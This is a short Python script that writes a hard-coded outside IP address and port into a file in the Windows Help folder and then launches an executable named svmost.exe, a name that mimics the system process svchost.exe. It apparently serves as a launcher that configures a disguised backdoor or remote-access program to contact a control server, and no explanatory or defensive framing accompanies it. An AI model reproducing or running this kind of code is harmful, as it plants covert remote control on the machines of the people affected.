import sys
import os

conf_path="C:\WINDOWS\Help\wmconf"
host="128.187.81.220"
port="9090"

def main():
    global host,port
    try:
        os.remove(conf_path)
    except OSError:
        pass

    with open(conf_path, "w") as cfp:
        cfp.write(host)
        cfp.write("\n")
        cfp.write(port)

    os.system("\"C:\WINDOWS\Help\svmost.exe\" local")

if __name__ == '__main__':
    main()
